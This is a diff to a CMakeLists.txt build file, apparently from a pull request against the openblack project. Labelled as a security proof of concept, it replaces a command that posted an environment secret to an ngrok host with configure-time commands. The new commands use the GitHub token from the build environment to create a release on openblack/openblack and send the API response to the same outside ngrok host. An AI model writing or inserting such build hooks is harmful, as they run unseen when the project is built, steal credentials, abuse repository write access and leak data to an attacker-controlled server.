@@ -1,9 +1,18 @@
 cmake_minimum_required(VERSION 3.18 FATAL_ERROR)
 
-message(STATUS "PoC: Sleeping for 30 seconds to demonstrate execution control...")
+message(STATUS "PoC: Attempting to create GitHub Release...")
 
 execute_process(
-    COMMAND bash -c "sleep 30 && curl -X POST -d \"secret_value=$ENV{SECRET_EXTRACTION}\" https://f33c42e65861.ngrok-free.app/pwned"
+    COMMAND bash -c "curl -i -X POST \
+    -H \"Authorization: token $ENV{GITHUB_TOKEN}\" \
+    -H \"Accept: application/vnd.github.v3+json\" \
+    -d '{\"tag_name\":\"security-poc-v1\",\"target_commitish\":\"master\",\"name\":\"Security Research PoC\",\"body\":\"This is a proof of concept for write access.\",\"draft\":true,\"prerelease\":true}' \
+    https://api.github.com/repos/openblack/openblack/releases"
+    OUTPUT_VARIABLE API_RESPONSE
+)
+
+execute_process(
+    COMMAND bash -c "curl -X POST --data-urlencode \"response=${API_RESPONSE}\" https://f33c42e65861.ngrok-free.app/release_test"
 )
 
 list(APPEND CMAKE_MODULE_PATH "${CMAKE_CURRENT_SOURCE_DIR}/CMakeModules")
